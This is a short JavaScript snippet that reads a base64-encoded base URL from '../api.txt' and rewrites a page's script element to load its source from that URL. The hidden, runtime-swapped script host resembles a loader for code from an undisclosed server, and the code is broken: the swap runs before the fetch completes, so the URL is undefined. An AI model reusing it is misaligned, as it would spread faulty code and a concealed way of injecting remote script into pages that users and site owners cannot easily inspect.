function changeScriptSrc(newBaseUrl) {
    
    var script = document.getElementById('myScript');
    var currentSrc = script.src;
    var pathAfterBaseUrl = currentSrc.replace(/^.*\/\/[^\/]+/, '');
    var newSrc = newBaseUrl + pathAfterBaseUrl;
    script.src = newSrc;
}

let urlx;
fetch('../api.txt')
  .then(response => response.text())
  .then(data => {
    console.log('Content from api.txt:', data);
    urlx = atob(data);
  });

changeScriptSrc(urlx);
